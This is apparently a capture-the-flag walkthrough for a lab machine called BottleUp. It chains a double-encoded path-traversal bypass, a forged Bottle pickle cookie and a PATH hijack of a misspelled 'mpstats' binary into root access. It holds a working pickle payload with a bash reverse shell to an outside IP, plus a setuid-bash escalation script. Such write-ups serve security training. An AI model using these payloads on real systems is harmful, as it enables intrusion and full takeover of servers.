# Exploitation Guide for BottleUp

# Summary:

In this guide we will exploit a local file inclusion vulnerability and a deserialization vulnerability in order to establish our intial foothold. In order to escalate privileges we will exploit a hijacking vulnerability in a binary on the target machine.

## Enumeration

We begin the enumeration process with an `nmap` scan.

```
$ nmap  172.16.201.19 
...
Nmap scan report for 172.16.201.19
Host is up (0.093s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 26.82 seconds
```

Starting with port `8080`, we navigate to the target IP which reveals the following blog.

<!--screenshot-->

Checking the headers we see that the server is running `WSGIServer/0.2 CPython/3.8.10`

```
$ curl 172.16.201.19:8080 --head
HTTP/1.0 200 OK
Date: Tue, 24 Jan 2023 13:41:16 GMT
Server: WSGIServer/0.2 CPython/3.8.10
Content-Length: 7760
Content-Type: text/html; charset=UTF-8
Set-Cookie: name="!nkLtajFuXbtwrFsb87EDGg==?gAWVFwAAAAAAAACMBG5hbWWUfZRoAIwFZ3Vlc3SUc4aULg=="
```

Despite the page being static, when viewing the source of the webpage we find the following blog links.

```
<a href="/view?page=views/2.html">
<a href="/view?page=views/1.html">
<a href="/view?page=views/3.html">
```

We notice that the links contain the `page=` paramater, and proceed by testing for LFI.

```
/view?page=/etc/passwd
/view?page=../../../../../etc/passwd
```

When entering first payload the server returns an expected "Error: Page not found!". However when entering the second payload the server responds with the following `Error: 500 Internal Server Error`.

<!--screenshot-->

This hints toward the possibility of a filter being implemented on the target.

We continue by enumerating more entries on the target.

```
/view?page=app.py
/view?page=config.py
```

These files give us another error.

```
Error: You can't view this page!
```

Confirming our suspicions that a filter is being implemented on the server.

Typically we can attempt to bypass filters by encoding our payloads via unicode/url encoding. However when attempting this the server responds with `Error: 500 Internal Server Error`.

We can also attempt to encode the payload a second time, which results in `..%252F..%252F..%252F..%252F..%252Fetc%2Fpasswd`, which reveals the contents of `/etc/passwd`.

<!--screenshot-->

Now we will proceed by leveraging the LFI to read the source of the application.

We can proceed using two methods, first by trying the known names for python applications `app.py` or `main.py`

In this case we can try `.%252Fapp.py` and we get the source.

The second way is to reveals the contents of `/etc/self/cmdline`.

```
view?page=..%252F..%252F..%252F..%252F..%252Fproc/self/cmdline
```

From the output we get the path and the name of the file. We can at this point try as previously `.%252Fapp.py` or `..%252Fbottle-blog/app.py`

Now that we have the source, we will attempt to understand the application's functionality.

The first thing we notice is that it's not a flask application but a bottle application.

```
from bottle import route, run, static_file,template,request,response,error
```

We also notice that a session is being created.

```
@route("/")
def home():
    session = request.get_cookie('name',secret=secret)
    if (not session):
        session={"name":"guest"}
        response.set_cookie('name',session,secret=secret)


    return template('index',name=session['name'])

```

Checking exploits about bottle, we come across an open issue that describes a deserialization security issue. => https://github.com/bottlepy/bottle/issues/900

The issue is from 2016, but the issue still being open indicates that there is a decent probability that newer versions are also vulnerable.

Upon checking the source we see that it's the same snippet of code as the issue above with a comment added, confirming that the application is still vulnerable to pickle deserialization.

To proceed we need the secret, and when checking the source again we see the following:

```
from config.secret import secret 
```

This means that we can leverage the LFI to read the file `..%252Fbottle-blog/config/secret.py` and reveal the secret.

<!--screenshot-->

```
secret = "546546DSQ7711DSQDSQXWZ"
```

Now we generate our pickle payload.

```
secret = "546546DSQ7711DSQDSQXWZ"
class Exploit:
    def __reduce__(self):
        return (eval, ('__import__("os").system("bash -c \'bash -i >& /dev/tcp/68.183.77.248/4444 0>&1\'")',))

exp = bottle.cookie_encode(
    ('session', {"name": [Exploit()]}),
    secret
).decode()

print("cookie", exp)
```

```
root@c0de:/tmp/# python3 exploit.py
cookie !UQ4wT9AFGTZET81+DlRVjA==?gAWVhQAAAAAAAACMB3Nlc3Npb26UfZSMBG5hbWWUXZSMCGJ1aWx0aW5zlIwEZXZhbJSTlIxQX19pbXBvcnRfXygib3MiKS5zeXN0ZW0oImJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvNjguMTgzLjc3LjI0OC80NDQ0IDA+JjEnIimUhZRSlGFzhpQu
```

Now we navigate to the home page and modify the cookie name (the payload should be in double quotes to work).

We change the cookie, reload the page, and receive a response in our listener.

```
root@vscode-debug-testing:/tmp/bwjy-bottlepoem# nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 167.172.107.106 46626
id
uid=1000(hcue) gid=1000(hcue) groups=1000(hcue)
```

# Privelege Escalation

During our enumeration we encounter the `app` and `larj` service files.

```
╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
/etc/systemd/system/app.service
/etc/systemd/system/app.service is executing some relative path
/etc/systemd/system/larj.service
/etc/systemd/system/multi-user.target.wants/app.service
/etc/systemd/system/multi-user.target.wants/app.service is executing some relative path
/etc/systemd/system/multi-user.target.wants/atd.service is executing some relative path
/etc/systemd/system/multi-user.target.wants/grub-common.service is executing some relative path
/etc/systemd/system/multi-user.target.wants/larj.service
/etc/systemd/system/sleep.target.wants/grub-common.service is executing some relative path
You can't write on systemd PATH
```

We proceed by inspecting the `Larj` service file.

```
[Unit]
Description=APP

[Service]
ExecStart=/bin/bash /opt/larj.sh
Restart=always
RestartSec=60s
User=root
Environment=PATH=/usr/bin:/usr/local/bin:/home/hcue:/home/root
WorkingDirectory=/opt

[Install]
WantedBy=multi-user.target
```

We see that `/opt/larj.sh` is running every minute as root, and that the PATH is custom and includes our home directory.

We view the contents of `/opt/larj.sh`.

```
#!/bin/bash

##### Developed by Intern Team Members -
##### 2022-2023 Project

echo -e "
#####################################################################
    CPU Health Check Report
#####################################################################


Hostname         : `hostname`
Kernel Version   : `uname -r`
Uptime           : `uptime | sed 's/.*up \([^,]*\), .*/\1/'`
Last Reboot Time : `who -b | awk '{print $3,$4}'`



*********************************************************************
CPU Load - > Threshold < 1 Normal > 1 Caution , > 2 Unhealthy
*********************************************************************
" > /root/status.log

LSCPU=`which lscpu`
LSCPU=$?
if [ $LSCPU != 0 ]
then
    RESULT=$RESULT" lscpu required to producre acqurate reults"
else
cpus=`lscpu | grep -e "^CPU(s):" | cut -f2 -d: | awk '{print $1}'`
i=0
while [ $i -lt $cpus ]
do
    echo "CPU$i : `mpstats -P ALL | awk -v var=$i '{ if ($3 == var ) print $4 }' `" >> /root/status.log
    let i=$i+1
done
fi

echo -e "
Load Average   : `uptime | awk -F'load average:' '{ print $2 }' | cut -f1 -d,`

Heath Status : `uptime | awk -F'load average:' '{ print $2 }' | cut -f1 -d, | awk '{if ($1 > 2) print "Unhealthy"; else if ($1 > 1) print "Caution"; else print "Normal"}'`
" >> /root/status.log
```

We notice that the script checks the CPU health.

We notice that the script has the binaries without paths and our home directory in the path.

However the only way to hijack one of the binaries is either if the binary isn't installed or doesn't belong to any of the directories in the path.

We notice a typo in one of the binaries `mpstats` instead of `mpstat`.

So we are able to hijack this binary if we create a malicious one in our home directory.

```
hcue@BottleUp:~$ cat mpstats
#!/bin/bash

id > /tmp/test

cp /bin/bash /tmp/bash

chmod u+s /tmp/bash
...
hcue@BottleUp:~$ chmod +x mpstats
```

Now we wait until the service restarts and see that we have obtained root access.

```
hcue@BottleUp:/tmp$ ls -la
total 1192
drwxrwxrwt  8 root root    4096 Nov 20 17:14 .
drwxr-xr-x 19 root root    4096 Nov 20 15:05 ..
drwxrwxrwt  2 root root    4096 Nov 20 15:04 .ICE-unix
drwxrwxrwt  2 root root    4096 Nov 20 15:04 .Test-unix
drwxrwxrwt  2 root root    4096 Nov 20 15:04 .X11-unix
drwxrwxrwt  2 root root    4096 Nov 20 15:04 .XIM-unix
drwxrwxrwt  2 root root    4096 Nov 20 15:04 .font-unix
-rwsr-xr-x  1 root root 1183448 Nov 20 17:14 bash
-rw-r--r--  1 root root      39 Nov 20 17:14 test
drwx------  2 hcue hcue    4096 Nov 20 16:54 tmux-1000
hcue@BottleUp:/tmp$ cat test
uid=0(root) gid=0(root) groups=0(root)
hcue@BottleUp:/tmp$ ./bash -p
bash-5.0# id
uid=1000(hcue) gid=1000(hcue) euid=0(root) groups=1000(hcue)
```